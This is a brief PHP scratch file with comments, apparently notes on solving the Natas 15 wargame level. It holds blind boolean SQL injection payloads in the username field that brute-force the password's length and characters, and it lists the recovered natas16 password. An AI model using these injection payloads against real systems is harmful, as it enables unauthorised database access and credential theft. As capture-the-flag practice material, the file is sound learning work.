<?php

$data = "SELECT * from users where username=\"".'abc" and length(password) = "1'."\"";
echo $data;

echo "</br>";

$data = "SELECT * from users where username=\"".'abc" and substring(password,1,1) = "1'."\"";
echo $data;


/*
- Brute-force length password: 
username=natas16%22+and+length(password)+=+%22§1§ -> Check response "This user exists." -> Length of password is 32

- Brute char by char password:
username=natas16%22+and+substring(password,§1§,1)+=+%22§a§ -> Check response "This user exists." -> waiheacj63wnnibroheqi3p9t0m5nhmh

??? But SQL case-insentive, char by char is upper or lower???
waiheacj63wnnibroheqi3p9t0m5nhmh

- Brute force binary char:
username=natas16%22+and+substring(password,§1§,1)+LIKE+BINARY+%22§w§ -> Check response "This user exists." -> WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

*/

?>
